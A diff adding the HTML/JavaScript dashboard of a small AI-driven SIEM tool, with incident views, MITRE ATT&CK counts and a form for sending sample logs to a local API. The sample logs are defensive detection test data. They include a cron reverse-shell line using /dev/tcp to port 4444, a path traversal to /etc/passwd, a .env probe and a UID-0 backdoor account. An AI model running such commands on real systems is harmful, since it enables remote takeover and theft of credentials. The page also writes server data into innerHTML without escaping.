@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI-SIEM Analyzer</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: sans-serif; background: #f0f0f5; color: #1a1a2e; }
+    .topbar { background: #1a1a2e; color: white; padding: 0 24px; display: flex; align-items: center; gap: 0; height: 52px; }
+    .logo { font-size: 16px; font-weight: 500; margin-right: 32px; }
+    .logo span { color: #7F77DD; }
+    .nav { display: flex; height: 100%; }
+    .nav-btn { background: none; border: none; color: #aaa; font-size: 13px; padding: 0 16px; cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.15s; height: 100%; }
+    .nav-btn:hover { color: white; }
+    .nav-btn.active { color: white; border-bottom-color: #7F77DD; }
+    .live-indicator { margin-left: auto; display: flex; align-items: center; gap: 6px; }
+    .live-dot { width: 7px; height: 7px; border-radius: 50%; background: #1D9E75; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+    .live-txt { font-size: 12px; color: #1D9E75; }
+    .page { display: none; padding: 20px; }
+    .page.active { display: block; }
+    .metrics { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 18px; }
+    .metric { background: white; border-radius: 10px; padding: 16px 20px; border: 1px solid #e8e8f0; }
+    .metric-label { font-size: 11px; color: #999; margin-bottom: 6px; text-transform: uppercase; letter-spacing: .04em; }
+    .metric-value { font-size: 26px; font-weight: 500; }
+    .metric-sub { font-size: 11px; margin-top: 3px; color: #999; }
+    .red { color: #E24B4A; } .purple { color: #534AB7; } .amber { color: #BA7517; } .green { color: #1D9E75; }
+    .grid-2 { display: grid; grid-template-columns: 1fr 300px; gap: 14px; }
+    .panel { background: white; border-radius: 10px; border: 1px solid #e8e8f0; overflow: hidden; margin-bottom: 14px; }
+    .panel-header { padding: 12px 16px; border-bottom: 1px solid #f0f0f8; font-size: 13px; font-weight: 500; display: flex; align-items: center; justify-content: space-between; }
+    .badge { font-size: 10px; padding: 2px 8px; border-radius: 20px; }
+    .badge-live { background: #E1F5EE; color: #085041; }
+    .badge-purple { background: #EEEDFE; color: #3C3489; }
+    .incident-row { padding: 12px 16px; border-bottom: 1px solid #f8f8fc; display: flex; align-items: flex-start; gap: 10px; cursor: pointer; transition: background 0.1s; }
+    .incident-row:hover { background: #f8f8fc; }
+    .incident-row:last-child { border-bottom: none; }
+    .sev-bar { width: 4px; border-radius: 2px; flex-shrink: 0; margin-top: 2px; }
+    .sev-bar.critical { background: #E24B4A; height: 42px; }
+    .sev-bar.high { background: #EF9F27; height: 42px; }
+    .sev-bar.medium { background: #7F77DD; height: 42px; }
+    .sev-bar.low { background: #1D9E75; height: 42px; }
+    .inc-title { font-size: 13px; font-weight: 500; margin-bottom: 3px; }
+    .inc-meta { font-size: 11px; color: #999; }
+    .sev-badge { font-size: 10px; font-weight: 500; padding: 2px 8px; border-radius: 20px; margin-left: auto; flex-shrink: 0; white-space: nowrap; }
+    .bc { background: #FCEBEB; color: #791F1F; }
+    .bh { background: #FAEEDA; color: #633806; }
+    .bm { background: #EEEDFE; color: #3C3489; }
+    .bl { background: #E1F5EE; color: #085041; }
+    .mitre-item { padding: 10px 16px; border-bottom: 1px solid #f8f8fc; display: flex; align-items: center; gap: 10px; }
+    .mitre-item:last-child { border-bottom: none; }
+    .mitre-id { font-size: 11px; font-family: monospace; font-weight: 500; color: #534AB7; background: #EEEDFE; padding: 2px 7px; border-radius: 4px; flex-shrink: 0; }
+    .mitre-name { font-size: 12px; color: #666; flex: 1; }
+    .mitre-count { font-size: 12px; font-weight: 500; color: #999; }
+    .bar-row { display: flex; align-items: center; gap: 10px; padding: 7px 16px; }
+    .bar-label { font-size: 12px; color: #666; width: 70px; flex-shrink: 0; }
+    .bar-bg { flex: 1; height: 6px; background: #f0f0f8; border-radius: 3px; overflow: hidden; }
+    .bar-fill { height: 100%; border-radius: 3px; transition: width 0.5s; }
+    .bar-val { font-size: 11px; color: #999; width: 20px; text-align: right; }
+    .log-feed { font-family: monospace; font-size: 12px; padding: 12px 16px; line-height: 1.9; max-height: 500px; overflow-y: auto; background: #fafafa; }
+    .log-entry { display: flex; gap: 10px; align-items: flex-start; padding: 3px 0; border-bottom: 1px solid #f0f0f0; }
+    .log-time { color: #999; flex-shrink: 0; font-size: 11px; min-width: 60px; }
+    .log-svc { font-size: 10px; font-weight: 500; padding: 1px 6px; border-radius: 4px; flex-shrink: 0; }
+    .svc-ssh { background: #EEEDFE; color: #3C3489; }
+    .svc-nginx { background: #FAEEDA; color: #633806; }
+    .svc-syslog { background: #FAECE7; color: #712B13; }
+    .svc-unknown { background: #f0f0f8; color: #999; }
+    .log-msg { flex: 1; color: #444; }
+    .log-fail { color: #E24B4A; font-weight: 500; }
+    .log-ok { color: #1D9E75; font-weight: 500; }
+    .log-ip { color: #534AB7; }
+    .log-warn { color: #BA7517; font-weight: 500; }
+    .analyze-panel { max-width: 640px; margin: 0 auto; }
+    .analyze-result { margin-top: 16px; border-radius: 10px; padding: 16px; border: 1px solid #e8e8f0; background: white; display: none; }
+    .analyze-result.show { display: block; }
+    .send-log-form { display: flex; flex-direction: column; gap: 10px; }
+    .send-log-form select { padding: 10px 14px; border: 1px solid #e0e0e8; border-radius: 8px; font-size: 13px; background: white; }
+    .send-log-form input { padding: 10px 14px; border: 1px solid #e0e0e8; border-radius: 8px; font-size: 12px; font-family: monospace; }
+    .btn { display: inline-flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 500; padding: 8px 16px; border-radius: 8px; border: 1px solid #e0e0e8; background: white; color: #1a1a2e; cursor: pointer; transition: all 0.15s; }
+    .btn:hover { background: #f8f8fc; }
+    .btn-primary { background: #534AB7; color: white; border-color: #534AB7; }
+    .btn-primary:hover { background: #4a42a8; }
+    .btn-green { background: #1D9E75; color: white; border-color: #1D9E75; }
+    .btn-green:hover { background: #198a65; }
+    .spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .empty { padding: 32px; text-align: center; color: #bbb; font-size: 13px; }
+    .field-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
+    .field-box { background: #f8f8fc; border-radius: 8px; padding: 10px 12px; }
+    .field-label { font-size: 10px; color: #999; text-transform: uppercase; letter-spacing: .04em; margin-bottom: 3px; }
+    .field-value { font-size: 13px; font-weight: 500; color: #1a1a2e; }
+    .explanation-box { background: #f8f8fc; border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #444; line-height: 1.7; margin-bottom: 16px; }
+    .section-title { font-size: 11px; font-weight: 500; color: #999; text-transform: uppercase; letter-spacing: .04em; margin-bottom: 8px; }
+    .actions-list { font-size: 13px; color: #444; line-height: 2; }
+    .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.4); z-index: 100; align-items: center; justify-content: center; }
+    .modal-overlay.show { display: flex; }
+    .modal { background: white; border-radius: 12px; width: 90%; max-width: 600px; max-height: 85vh; overflow-y: auto; }
+    .modal-header { padding: 16px 20px; border-bottom: 1px solid #f0f0f8; display: flex; align-items: center; gap: 10px; position: sticky; top: 0; background: white; z-index: 1; }
+    .modal-body { padding: 20px; }
+    .modal-close { margin-left: auto; background: none; border: none; font-size: 20px; cursor: pointer; color: #999; line-height: 1; }
+    .result-banner { padding: 10px 14px; border-radius: 8px; font-size: 13px; margin-bottom: 10px; }
+    .banner-success { background: #E1F5EE; color: #085041; }
+    .banner-error { background: #FCEBEB; color: #791F1F; }
+    .banner-info { background: #EEEDFE; color: #3C3489; }
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo"><span>AI</span>-SIEM Analyzer</div>
+  <nav class="nav">
+    <button class="nav-btn active" onclick="showPage('dashboard', this)">Dashboard</button>
+    <button class="nav-btn" onclick="showPage('logs', this)">Live Logs</button>
+    <button class="nav-btn" onclick="showPage('incidents', this)">Incidents</button>
+    <button class="nav-btn" onclick="showPage('analyze', this)">Analyze</button>
+  </nav>
+  <div class="live-indicator">
+    <div class="live-dot"></div>
+    <span class="live-txt">Live</span>
+  </div>
+</div>
+
+<!-- PAGE 1: DASHBOARD -->
+<div id="page-dashboard" class="page active">
+  <div class="metrics">
+    <div class="metric">
+      <div class="metric-label">Total incidents</div>
+      <div class="metric-value red" id="total-incidents">—</div>
+      <div class="metric-sub">all time</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Top MITRE technique</div>
+      <div class="metric-value purple" id="top-mitre">—</div>
+      <div class="metric-sub" id="top-mitre-count">—</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Critical incidents</div>
+      <div class="metric-value red" id="critical-count">0</div>
+      <div class="metric-sub">require action</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Most common severity</div>
+      <div class="metric-value amber" id="top-severity">—</div>
+      <div class="metric-sub">dominant level</div>
+    </div>
+  </div>
+  <div class="grid-2">
+    <div>
+      <div class="panel">
+        <div class="panel-header">
+          Recent incidents
+          <span class="badge badge-live">Live</span>
+        </div>
+        <div id="dashboard-incidents"><div class="empty">Loading...</div></div>
+      </div>
+    </div>
+    <div>
+      <div class="panel">
+        <div class="panel-header">MITRE ATT&CK hits</div>
+        <div id="mitre-list"><div class="empty">Loading...</div></div>
+      </div>
+      <div class="panel">
+        <div class="panel-header">Severity breakdown</div>
+        <div id="severity-bars" style="padding: 8px 0;"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 2: LIVE LOGS -->
+<div id="page-logs" class="page">
+  <div class="panel">
+    <div class="panel-header">
+      Live log feed
+      <span class="badge badge-live">Streaming</span>
+    </div>
+    <div class="log-feed" id="log-feed">
+      <div class="empty">Loading logs...</div>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 3: INCIDENTS -->
+<div id="page-incidents" class="page">
+  <div class="panel">
+    <div class="panel-header">
+      All incidents
+      <span class="badge badge-purple" id="incident-count-badge">0</span>
+    </div>
+    <div id="incidents-full-list"><div class="empty">Loading...</div></div>
+  </div>
+</div>
+
+<!-- PAGE 4: ANALYZE -->
+<div id="page-analyze" class="page">
+  <div class="analyze-panel">
+
+    <div class="panel" style="margin-bottom:14px;">
+      <div class="panel-header">Send a test log</div>
+      <div style="padding:16px;">
+        <div class="send-log-form">
+          <select id="log-template">
+            <optgroup label="SSH attacks">
+              <option value="ssh|Failed password for root from 192.168.1.100 port 22 ssh2">SSH — brute force failed (root)</option>
+              <option value="ssh|Accepted password for root from 192.168.1.100 port 22 ssh2">SSH — successful login (root)</option>
+              <option value="ssh|Failed password for admin from 10.10.10.50 port 22 ssh2">SSH — brute force failed (admin)</option>
+              <option value="ssh|Failed password for ubuntu from 172.16.0.99 port 22 ssh2">SSH — brute force failed (ubuntu)</option>
+              <option value="ssh|Accepted password for ubuntu from 172.16.0.99 port 22 ssh2">SSH — successful login (ubuntu)</option>
+            </optgroup>
+            <optgroup label="Web attacks (Nginx)">
+              <option value="nginx|192.168.1.100 - - [04/Apr/2026:07:00:01] &quot;GET /admin/../../../etc/passwd HTTP/1.1&quot; 200 1452">Nginx — path traversal attack</option>
+              <option value="nginx|192.168.1.100 - - [04/Apr/2026:07:00:02] &quot;GET /.env HTTP/1.1&quot; 200 312">Nginx — .env file exposed</option>
+              <option value="nginx|192.168.1.100 - - [04/Apr/2026:07:00:03] &quot;POST /wp-login.php HTTP/1.1&quot; 200 4521">Nginx — WordPress brute force</option>
+              <option value="nginx|10.10.10.50 - - [04/Apr/2026:07:00:04] &quot;GET /phpmyadmin/ HTTP/1.1&quot; 200 8432">Nginx — phpMyAdmin probe</option>
+            </optgroup>
+            <optgroup label="System events (Syslog)">
+              <option value="syslog|Apr 04 07:00:01 server CRON[1234]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1)">Syslog — reverse shell cron job</option>
+              <option value="syslog|Apr 04 07:00:02 server sudo[5678]: kali : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/bin/bash">Syslog — suspicious sudo to root</option>
+              <option value="syslog|Apr 04 07:00:03 server useradd[9012]: new user: name=backdoor, UID=0, GID=0">Syslog — backdoor user created</option>
+            </optgroup>
+          </select>
+          <input type="text" id="custom-log" placeholder="Or type: ssh|your log message / nginx|your log message" />
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-primary" style="flex:1" onclick="sendLog()">Send log to API</button>
+            <button class="btn btn-green" onclick="sendMultiple()">Send attack scenario</button>
+          </div>
+        </div>
+        <div id="send-result" style="margin-top:10px;display:none;"></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-header">AI analysis engine</div>
+      <div style="padding:16px;">
+        <p style="font-size:13px;color:#666;margin-bottom:14px;">Run the AI engine on all unanalyzed logs. If a threat is detected, an incident is saved and a PDF report is generated automatically.</p>
+        <button class="btn btn-primary" id="analyze-btn" onclick="runAnalysis()">Run AI analysis</button>
+        <div id="analyze-result" class="analyze-result"></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- INCIDENT DETAIL MODAL -->
+<div class="modal-overlay" id="incident-modal">
+  <div class="modal">
+    <div class="modal-header">
+      <span style="font-size:14px;font-weight:500;" id="modal-title">Incident detail</span>
+      <button class="modal-close" onclick="closeModal()">&#x2715;</button>
+    </div>
+    <div class="modal-body" id="modal-body"></div>
+  </div>
+</div>
+
+<script>
+  const SEV_CLASS = { critical:'bc', high:'bh', medium:'bm', low:'bl' }
+  const MITRE_NAMES = {
+    T1110:'Brute Force', T1021:'Remote Services', T1053:'Scheduled Task',
+    T1046:'Network Scan', T1083:'File Discovery', T1071:'App Layer Protocol',
+    T1059:'Command Execution', T1136:'Create Account', T1190:'Exploit Public App'
+  }
+
+  const ATTACK_SCENARIO = [
+    { source: 'ssh', message: 'Failed password for root from 185.220.101.5 port 54321 ssh2' },
+    { source: 'ssh', message: 'Failed password for root from 185.220.101.5 port 54322 ssh2' },
+    { source: 'ssh', message: 'Failed password for root from 185.220.101.5 port 54323 ssh2' },
+    { source: 'nginx', message: '185.220.101.5 - - [04/Apr/2026:07:00:01] "GET /.env HTTP/1.1" 200 312' },
+    { source: 'nginx', message: '185.220.101.5 - - [04/Apr/2026:07:00:02] "GET /admin/../../../etc/passwd HTTP/1.1" 200 1452' },
+    { source: 'ssh', message: 'Accepted password for root from 185.220.101.5 port 54324 ssh2' },
+    { source: 'syslog', message: 'Apr 04 07:00:03 server CRON[1234]: (root) CMD (/bin/bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)' },
+  ]
+
+  function showPage(name, btn) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'))
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'))
+    document.getElementById('page-' + name).classList.add('active')
+    btn.classList.add('active')
+    if (name === 'logs') loadLogs()
+    if (name === 'incidents') loadIncidentsFull()
+  }
+
+  async function loadDashboard() {
+    try {
+      const [statsRes, incRes] = await Promise.all([
+        fetch('/stats'), fetch('/incidents')
+      ])
+      const stats = await statsRes.json()
+      const incData = await incRes.json()
+
+      document.getElementById('total-incidents').textContent = stats.total_incidents
+      document.getElementById('critical-count').textContent = stats.severity_breakdown['critical'] || 0
+
+      if (stats.top_mitre_techniques.length > 0) {
+        const top = stats.top_mitre_techniques[0]
+        document.getElementById('top-mitre').textContent = top.technique
+        document.getElementById('top-mitre-count').textContent = top.count + ' detections'
+      }
+
+      const sev = stats.severity_breakdown
+      const topSev = Object.entries(sev).sort((a,b) => b[1]-a[1])[0]
+      if (topSev) document.getElementById('top-severity').textContent = topSev[0].toUpperCase()
+
+      const mitreEl = document.getElementById('mitre-list')
+      if (stats.top_mitre_techniques.length === 0) {
+        mitreEl.innerHTML = '<div class="empty">No data yet</div>'
+      } else {
+        mitreEl.innerHTML = stats.top_mitre_techniques.map(t => `
+          <div class="mitre-item">
+            <span class="mitre-id">${t.technique}</span>
+            <span class="mitre-name">${MITRE_NAMES[t.technique] || 'Unknown'}</span>
+            <span class="mitre-count">${t.count}x</span>
+          </div>
+        `).join('')
+      }
+
+      const total = Object.values(sev).reduce((a,b) => a+b, 0) || 1
+      const sevColors = { critical:'#E24B4A', high:'#EF9F27', medium:'#7F77DD', low:'#1D9E75' }
+      document.getElementById('severity-bars').innerHTML = ['critical','high','medium','low'].map(s => `
+        <div class="bar-row">
+          <span class="bar-label">${s.charAt(0).toUpperCase()+s.slice(1)}</span>
+          <div class="bar-bg"><div class="bar-fill" style="width:${((sev[s]||0)/total*100).toFixed(0)}%;background:${sevColors[s]}"></div></div>
+          <span class="bar-val">${sev[s]||0}</span>
+        </div>
+      `).join('')
+
+      const dashInc = document.getElementById('dashboard-incidents')
+      if (incData.incidents.length === 0) {
+        dashInc.innerHTML = '<div class="empty">No incidents yet — send logs and run analysis</div>'
+      } else {
+        dashInc.innerHTML = incData.incidents.slice(0,5).map(inc => `
+          <div class="incident-row" onclick="openModal(${inc.id})">
+            <div class="sev-bar ${inc.severity}"></div>
+            <div style="flex:1">
+              <div class="inc-title">${inc.threat_type}</div>
+              <div class="inc-meta">${inc.attacker_ip} · ${inc.mitre_technique} · ${inc.created_at.slice(0,16)}</div>
+            </div>
+            <span class="sev-badge ${SEV_CLASS[inc.severity]||'bm'}">${inc.severity}</span>
+          </div>
+        `).join('')
+      }
+    } catch(e) { console.error(e) }
+  }
+
+  async function loadLogs() {
+    try {
+      const res = await fetch('/logs/recent')
+      const data = await res.json()
+      const feed = document.getElementById('log-feed')
+      if (data.logs.length === 0) {
+        feed.innerHTML = '<div class="empty">No logs yet — send some from the Analyze tab</div>'
+        return
+      }
+      feed.innerHTML = data.logs.map(log => {
+        const svc = log.service || 'unknown'
+        const isOk = log.action === 'Accepted'
+        const isFail = log.action === 'Failed'
+        const isWarn = ['syslog_event','POST','GET'].includes(log.action)
+        let msgHtml = ''
+
+        if (svc === 'ssh') {
+          msgHtml = `<span class="${isOk ? 'log-ok' : 'log-fail'}">${log.action}</span> · user: ${log.user||'—'} · from: <span class="log-ip">${log.source_ip||'—'}</span>`
+        } else if (svc === 'nginx') {
+          const code = log.status_code || '—'
+          const codeClass = code >= 400 ? 'log-fail' : code === 200 ? 'log-ok' : ''
+          msgHtml = `<span class="log-warn">${log.action}</span> ${log.url||'—'} · <span class="${codeClass}">${code}</span> · from: <span class="log-ip">${log.source_ip||'—'}</span>`
+        } else if (svc === 'syslog' || svc.includes('CRON') || svc.includes('sudo')) {
+          msgHtml = `<span class="log-warn">${log.service||'syslog'}</span> · ${log.message||log.raw||'—'}`
+        } else {
+          msgHtml = log.raw || '—'
+        }
+
+        return `
+          <div class="log-entry">
+            <span class="log-time">${(log.timestamp||'').slice(11,19)}</span>
+            <span class="log-svc svc-${svc}">${svc}</span>
+            <span class="log-msg">${msgHtml}</span>
+          </div>
+        `
+      }).join('')
+    } catch(e) { console.error(e) }
+  }
+
+  async function loadIncidentsFull() {
+    try {
+      const res = await fetch('/incidents')
+      const data = await res.json()
+      const el = document.getElementById('incidents-full-list')
+      document.getElementById('incident-count-badge').textContent = data.incidents.length
+      if (data.incidents.length === 0) {
+        el.innerHTML = '<div class="empty">No incidents detected yet</div>'
+        return
+      }
+      el.innerHTML = data.incidents.map(inc => `
+        <div class="incident-row" onclick="openModal(${inc.id})">
+          <div class="sev-bar ${inc.severity}"></div>
+          <div style="flex:1">
+            <div class="inc-title">${inc.threat_type}</div>
+            <div class="inc-meta">${inc.attacker_ip} · ${inc.mitre_technique} · ${inc.affected_user} · ${inc.created_at.slice(0,16)}</div>
+          </div>
+          <span class="sev-badge ${SEV_CLASS[inc.severity]||'bm'}">${inc.severity}</span>
+        </div>
+      `).join('')
+    } catch(e) { console.error(e) }
+  }
+
+  async function openModal(id) {
+    try {
+      const res = await fetch(`/incidents/${id}`)
+      const inc = await res.json()
+      document.getElementById('modal-title').textContent = inc.threat_type
+      document.getElementById('modal-body').innerHTML = `
+        <div class="field-grid">
+          <div class="field-box"><div class="field-label">Severity</div><div class="field-value">${inc.severity.toUpperCase()}</div></div>
+          <div class="field-box"><div class="field-label">MITRE technique</div><div class="field-value" style="color:#534AB7">${inc.mitre_technique}</div></div>
+          <div class="field-box"><div class="field-label">Attacker IP</div><div class="field-value">${inc.attacker_ip}</div></div>
+          <div class="field-box"><div class="field-label">Affected user</div><div class="field-value">${inc.affected_user}</div></div>
+        </div>
+        <div class="section-title">AI explanation</div>
+        <div class="explanation-box">${inc.explanation}</div>
+        <div class="section-title" style="margin-bottom:8px">Recommended actions</div>
+        <div class="actions-list">
+          1. Block IP <strong>${inc.attacker_ip}</strong> at the firewall immediately<br>
+          2. Reset password for account <strong>${inc.affected_user}</strong><br>
+          3. Review all activity from this IP in the last 24 hours<br>
+          4. Enable multi-factor authentication on affected account<br>
+          5. Check for any files created or modified during the session
+        </div>
+        <div style="margin-top:16px;">
+          <a href="/reports/${inc.id}/pdf" target="_blank">
+            <button class="btn btn-primary">Download PDF report</button>
+          </a>
+        </div>
+      `
+      document.getElementById('incident-modal').classList.add('show')
+    } catch(e) { console.error(e) }
+  }
+
+  function closeModal() {
+    document.getElementById('incident-modal').classList.remove('show')
+  }
+
+  async function sendLog() {
+    const custom = document.getElementById('custom-log').value.trim()
+    const template = document.getElementById('log-template').value
+    const resultEl = document.getElementById('send-result')
+    let source = 'ssh'
+    let message = custom || template
+
+    if (!custom && template.includes('|')) {
+      const parts = template.split('|')
+      source = parts[0]
+      message = parts[1]
+    } else if (custom && custom.includes('|')) {
+      const parts = custom.split('|')
+      source = parts[0]
+      message = parts[1]
+    }
+
+    try {
+      const res = await fetch('/logs', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ source, message })
+      })
+      const data = await res.json()
+      resultEl.style.display = 'block'
+      resultEl.innerHTML = `<div class="result-banner banner-success">Log sent — service: ${data.parsed.service||source}, action: ${data.parsed.action}</div>`
+      document.getElementById('custom-log').value = ''
+    } catch(e) {
+      resultEl.style.display = 'block'
+      resultEl.innerHTML = '<div class="result-banner banner-error">Failed to send log — check API is running</div>'
+    }
+  }
+
+  async function sendMultiple() {
+    const resultEl = document.getElementById('send-result')
+    resultEl.style.display = 'block'
+    resultEl.innerHTML = '<div class="result-banner banner-info">Sending attack scenario (7 logs)...</div>'
+
+    let sent = 0
+    for (const log of ATTACK_SCENARIO) {
+      try {
+        await fetch('/logs', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(log)
+        })
+        sent++
+        await new Promise(r => setTimeout(r, 300))
+      } catch(e) {}
+    }
+
+    resultEl.innerHTML = `<div class="result-banner banner-success">${sent} logs sent — now click Run AI analysis to detect the attack</div>`
+  }
+
+  async function runAnalysis() {
+    const btn = document.getElementById('analyze-btn')
+    const resultEl = document.getElementById('analyze-result')
+    btn.innerHTML = '<span class="spinner"></span> Analyzing...'
+    btn.disabled = true
+
+    try {
+      const res = await fetch('/analyze', { method: 'POST' })
+      const data = await res.json()
+      resultEl.classList.add('show')
+
+      if (!data.threat_detected) {
+        resultEl.innerHTML = `<div class="result-banner banner-info">No threats detected in ${data.logs_analyzed||0} logs analyzed.</div>`
+      } else {
+        resultEl.innerHTML = `
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:14px;">
+            <span style="font-size:15px;font-weight:500;">Threat detected</span>
+            <span class="sev-badge ${SEV_CLASS[data.incident?.severity]||'bm'}">${data.incident?.severity||''}</span>
+          </div>
+          <div class="field-grid" style="margin-bottom:14px;">
+            <div class="field-box"><div class="field-label">Type</div><div class="field-value">${data.incident?.threat_type||'—'}</div></div>
+            <div class="field-box"><div class="field-label">MITRE</div><div class="field-value" style="color:#534AB7">${data.incident?.mitre_technique||'—'}</div></div>
+            <div class="field-box"><div class="field-label">Attacker IP</div><div class="field-value">${data.incident?.attacker_ip||'—'}</div></div>
+            <div class="field-box"><div class="field-label">Affected user</div><div class="field-value">${data.incident?.affected_user||'—'}</div></div>
+          </div>
+          <div class="explanation-box">${data.incident?.explanation||''}</div>
+          <a href="/reports/${data.incident_id}/pdf" target="_blank">
+            <button class="btn btn-primary">Download PDF report</button>
+          </a>
+        `
+        loadDashboard()
+      }
+    } catch(e) {
+      resultEl.classList.add('show')
+      resultEl.innerHTML = '<div class="result-banner banner-error">Analysis failed — check internet connection and API</div>'
+    }
+
+    btn.innerHTML = 'Run AI analysis'
+    btn.disabled = false
+  }
+
+  loadDashboard()
+  setInterval(loadDashboard, 10000)
+  setInterval(() => {
+    if (document.getElementById('page-logs').classList.contains('active')) loadLogs()
+  }, 5000)
+</script>
+</body>
+</html>
